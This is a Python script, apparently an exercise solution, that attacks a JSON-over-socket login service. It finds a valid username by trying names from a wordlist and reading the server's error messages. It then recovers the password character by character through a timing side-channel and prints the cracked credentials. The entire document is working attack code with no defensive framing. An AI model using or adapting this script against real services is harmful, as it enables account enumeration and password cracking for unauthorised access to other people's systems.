import socket
import sys
import json
import string
import time

hostname = sys.argv[1]
port = int(sys.argv[2])

with open('logins.txt', 'r') as login_file:
    logins = map(lambda l: l.strip(), login_file.readlines())


with socket.socket() as my_sock:
    my_sock.connect((hostname, port))

    total_time = 0
    count = 0

    # find login
    username = None
    password = ''
    for login in logins:
        data = {
            'login': login,
            'password': password
        }
        start = time.perf_counter()
        my_sock.send(json.dumps(data).encode())
        resp = my_sock.recv(1024).decode()
        end = time.perf_counter()
        total_time += end - start
        count += 1

        result = json.loads(resp)['result']
        if result == 'Wrong password!' or result == 'Exception happened during login':
            username = login
            break

    avg_time = total_time / count
    # find password
    while True:
        for ch in string.ascii_letters + string.digits:
            new_password = password + ch
            data = {
                'login': username,
                'password': new_password
            }
            start = time.perf_counter()
            my_sock.send(json.dumps(data).encode())
            resp = my_sock.recv(1024).decode()
            end = time.perf_counter()
            time_taken = end - start

            resp = json.loads(resp)

            if time_taken > avg_time:
                password = new_password
                break

            if resp['result'] == 'Connection success!':
                print(json.dumps(data))
                sys.exit(0)






